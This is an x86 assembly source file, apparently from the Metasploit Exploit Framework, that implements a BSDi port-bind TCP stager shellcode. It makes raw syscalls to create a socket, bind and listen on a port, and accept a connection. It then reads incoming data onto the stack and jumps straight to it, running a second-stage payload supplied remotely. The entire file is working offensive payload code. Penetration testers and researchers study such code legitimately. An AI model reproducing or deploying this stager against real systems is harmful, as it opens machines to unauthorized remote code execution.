;;
; 
;        Name: stager_sock_bind
;   Qualities: Can Have Nulls
;   Platforms: BSDi
;     Authors: skape <mmiller [at] hick.org>
;              optyx <optyx [at] uberhax0r.net>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSDi portbind TCP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

_start:

initialization:
	push dword 0xc3000700
	mov  eax, 0x9a
	cdq
	push eax
	mov  esi, esp

socket:
	xor  eax, eax
	push eax
	inc  eax
	push eax
	inc  eax
	push eax
	mov  al, 0x61
	call esi

bind:
	push edx
	push dword 0xbfbf0210
	mov  ebx, esp
	push byte 0x10
	push ebx
	push eax
	push byte 0x68
	pop  eax
	call esi

listen:
	mov  al, 0x6a
	call esi

accept:
	pop  ecx
	push edx
	push edx
	push ecx
	mov  al, 0x1e
	call esi
	xchg eax, edi

read:
	push byte 0x3
	pop  eax
	mov  dh, 0xc
	push edx
	push ebx
	push edi
	call esi
	jmp  ebx
